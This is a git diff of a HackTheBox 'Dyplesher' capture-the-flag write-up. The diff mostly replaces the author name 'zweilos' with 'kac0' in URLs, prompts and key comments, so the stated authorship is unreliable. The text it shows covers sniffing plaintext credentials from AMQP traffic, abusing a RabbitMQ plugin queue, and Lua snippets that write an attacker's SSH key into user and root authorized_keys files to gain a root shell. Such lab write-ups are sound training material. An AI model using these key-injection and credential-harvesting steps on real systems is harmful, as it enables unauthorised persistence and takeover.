+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-code.png)
 
 The final list of files included in my project before compiling.  After I built my `dyplesher-plugin.jar` file I uploaded it through the portal and hoped that it would pass inspection and be loaded.
 
@@ -1110,7 +1111,7 @@ The final list of files included in my project before compiling.  After I built 
 ### Enumeration as `MinatoTW`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ ssh -i dyplesher.key MinatoTW@dyplesher.htb 
 The authenticity of host 'dyplesher.htb (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:8AtWtgBblX2fSG+yy8gqhogbr3lHiMCppbBkL1YY/Cg.
@@ -1156,15 +1157,15 @@ Capturing on 'any'
 
 Since I didn't have a GUI I decided to try running tshark to see if there was interesting traffic on the host. I wrote the captured packets to a .pcapng file and exfiltrated it to my computer after capturing for a few minutes.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-wireshark-erlang-rabbit%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-wireshark-erlang-rabbit%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
 I noticed pretty quickly the Erlang Port Mapper traffic identifying port 25672 as a RabbitMQ node.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-wireshark-memcached.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-wireshark-memcached.png)
 
 Next I identified some traffic that contained the memcache information I had pulled from that service earlier.  It looked like there was a `backup.sh` shell script running that was either reading to or writing an email, username, and password key to memcache.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-wireshark-amqp%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-wireshark-amqp%2520%25281%2529.png)
 
 My next find in the packet capture was a jackpot.  There was a full list of user information being sent through AMQP that contained names, emails, and passwords for a list of users, amongst other information.
 
@@ -1326,7 +1327,7 @@ yuntao
 
 The next folder contained the `backup.sh` script I had noticed in my Wireshark packet capture.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/18-backup-script.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18-backup-script.png)
 
 In the `/backup` folder I found the script and files that had given me information earlier through memcached.
 
@@ -1407,20 +1408,20 @@ Sorry, user felamos may not run sudo on dyplesher.
 
 ```text
 felamos@dyplesher:~$ cat user.txt 
-a8ff****9dc8
+a8ff************************9dc8
 ```
 
 However, I was happy to find the `user.txt` file under this user's home directory.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/18-yuntao-note.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18-yuntao-note.png)
 
 in the `/yuntao` folder there was a file called`send.sh` with a note to `yuntao` regarding user created plugins and using the `plugin_data` Exchange and Queue. It also says to send the URL of new plugins and the server wil automatically add them. This looks like a good privilege escalation route if I could figure out how to publish a cuberite plugin.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/19-screen1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-screen1.png)
 
 While checking out running processes I noticed `screen` was running so I attached to each of the two sessions,
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/19-screen2.png.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-screen2.png.png)
 
 but unfortunately neither had anything useful, and looked like it was all running gameworld information.
 
@@ -1525,14 +1526,14 @@ I created a test script using the information in the article to see if I could s
 I found a few articles that gave me some good information, including one that specifically dealt with using RabbitMQ to communicate with Minecraft.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ python3 ./rabbit-pika.py
 Traceback (most recent call last):
   File "./rabbit-pika.py", line 15, in <module>
     channel.queue_declare(queue='plugin_data')
-  File "/home/zweilos/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 2507, in queue_declare
+  File "/home/kac0/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 2507, in queue_declare
     self._flush_output(declare_ok_result.is_ready)
-  File "/home/zweilos/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 1340, in _flush_output
+  File "/home/kac0/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 1340, in _flush_output
     raise self._closing_reason  # pylint: disable=E0702
 pika.exceptions.ChannelClosedByBroker: (406, "PRECONDITION_FAILED - inequivalent arg 'durable' for queue 'plugin_data' in vhost '/': received 'false' but current is 'true'")
 ```
@@ -1682,7 +1683,7 @@ drwxr-xr-x 3 MinatoTW MinatoTW 4096 Oct 12 14:30 ..
 
 I went back and looked closer into the Minecraft related files in `MinatoTW`'s user folder.  In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/20-cuberite-webadmin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/20-cuberite-webadmin.png)
 
 The `template.lua` file included code for loading plugins and running code for the webadmin site.  I did some research on lua and cRoot, which led me to pages related to Cuberite, which made me sure I was on the right track.  
 
@@ -1699,7 +1700,7 @@ If this server will execute Lua scripts as code then perhaps I could use one to 
 ```lua
 file = io.open("/home/MinatoTW/.ssh/authorized_keys", "a+")
 
-file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")
+file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= kac0@kali")
 
 file.close()
 ```
@@ -1713,7 +1714,7 @@ Next I tried running the script against root through my remote RabbitMQ connecti
 ```lua
 file = io.open("/root/.ssh/authorized_keys", "w")
 
-file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")
+file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= kac0@kali")
 
 file.close()
 ```
@@ -1723,7 +1724,7 @@ My first try was unsuccessful, but after some troubleshooting, I realized that f
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ ssh -i minato.key root@dyplesher.htb                                                          130 ⨯
 Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
 
@@ -1749,5 +1750,5 @@ root@dyplesher:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 dyplesher
 root@dyplesher:~# cat root.txt 
-a0a4****74f0
+a0a4************************74f0
 ```
